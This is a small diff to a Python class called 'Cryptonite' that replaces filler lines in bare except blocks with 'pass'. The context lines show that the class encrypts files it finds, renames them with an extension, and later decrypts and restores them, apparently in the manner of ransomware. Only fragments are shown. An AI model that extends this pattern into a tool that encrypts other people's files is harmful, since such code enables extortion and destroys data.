@@ -83,7 +83,7 @@ class Cryptonite():
                         f.write(encryptedData)
                     os.rename(file, newfile)
                 except:
-                    a = "error" # just to fill the except block 
+                    pass 
 
 
     def findFiles(self):
@@ -123,7 +123,7 @@ class Cryptonite():
                         f.write(decryptedData)
                     os.rename(str(files)+EXT, files)
                 except:
-                    a = "error" # just to fill the except block
+                    pass
 
 
 
